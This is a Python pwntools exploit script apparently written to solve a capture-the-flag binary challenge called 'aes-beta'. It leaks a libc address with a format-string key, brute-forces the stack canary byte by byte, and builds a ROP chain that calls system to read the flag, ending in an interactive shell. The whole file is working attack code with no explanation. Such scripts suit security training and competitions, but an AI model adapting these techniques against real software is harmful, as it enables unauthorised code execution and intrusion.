#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'build/aes-beta')

host = args.HOST or 'aesbeta.challs.olicyber.it'
port = int(args.PORT or 38310)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('glibc/libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('glibc/libc.so.6')
else:
    libc = ELF('glibc/libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    pow(io)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
brva 0x1504
set follow-fork-mode child
continue
'''.format(**locals())


BLOCKS_NUMBER = 8
KEY = b"%9$p%7$n"

def pow(io):
    log.info("Solving POW")
    io.recvuntil(b"Do Hashcash for 26 bits with resource \"")
    resource = io.recvline().strip()[:-1]
    command = ['hashcash', '-mCb26', resource]
    try:
        result = subprocess.run(command, check=True, text=True, capture_output=True)
        io.sendlineafter(b"Result: ", result.stdout.strip().encode())

    except subprocess.CalledProcessError as e:
        log.error(e.stderr)
    
def add_message(message):
    io.sendlineafter(b"> ", str(1).encode())
    io.sendlineafter(b"Enter message size: ", str(len(message)).encode())
    io.sendlineafter(b"Enter message: ", message)
    result = io.recvline()
    assert b"PID: " in result
    return result.strip().split()[-1]

def get_message(pid):
    sleep(0.2)
    io.sendlineafter(b"> ", str(2).encode())
    io.sendlineafter(b"Enter PID: ", pid)
    line = io.recvline()
    if b"running" in line:
        return get_message(pid)
    status = int(line.strip().split()[-1])
    io.recvuntil(b"Ciphertext:")
    ciphertext = io.recvline()
    return status, ciphertext

def get_canary():
    canary = b""
    for i in range(8):
        for j in range(0xff):
            payload = b"A" * 72
            payload += canary
            payload += bytes([j])
            pid = add_message(payload)
            status, _ = get_message(pid)
            if status == 0:
                canary += bytes([j])
                progress(i)
                break
    return canary

def progress(value):
    sys.stdout.write('\r')
    # sys.stdout.write("[*] Finding canary: [%-8s]\n" % ('#'*(value+1)))
    sys.stdout.write(f"[*] Finding canary: {value + 1}/8")
    sys.stdout.flush()
    if value == 7:
        print()

def decrypt(encrypted_message):
    decrypted_message = b""
    for i, c in enumerate(encrypted_message):
        decrypted_message += bytes([c ^ KEY[i % len(KEY)]])
    return decrypted_message
    
def encrypt(message):
    payload = b""
    for i, c in enumerate(message):
        payload += bytes([c ^ KEY[i % len(KEY)]])
    return payload
    
io = start()

io.sendlineafter(b"Enter key:", KEY)
io.sendlineafter(b"Enter number of blocks: ", str(BLOCKS_NUMBER).encode())

io.recvuntil(b"You chose the following key:\n")
libc.address = int(io.recvline(keepends=False),16) - 0x29d90
log.success(f"libc@ {hex(libc.address)}")

canary = u64(decrypt(get_canary()))
log.success(f"canary: {hex(canary)}")

rop = ROP(libc)
payload = encrypt(b"cat flag; exit".ljust(72, b"\x00"))
payload += p64(canary)
payload += b"A" * 8
payload += p64(rop.find_gadget(['pop rbx', 'ret'])[0])
payload += p64(libc.symbols['system'])
payload += p64(libc.address + 0x0000000000043817) # mov rdi, [rsp + 0x10], ..., call rbx;

assert(len(payload) <= 0xE*8)
pid = add_message(encrypt(payload))

log.success(f"PID: {pid.decode()}")
sleep(1)
io.sendlineafter(b"> ", str(2).encode())
io.sendlineafter(b"Enter PID: ", pid)

io.interactive()
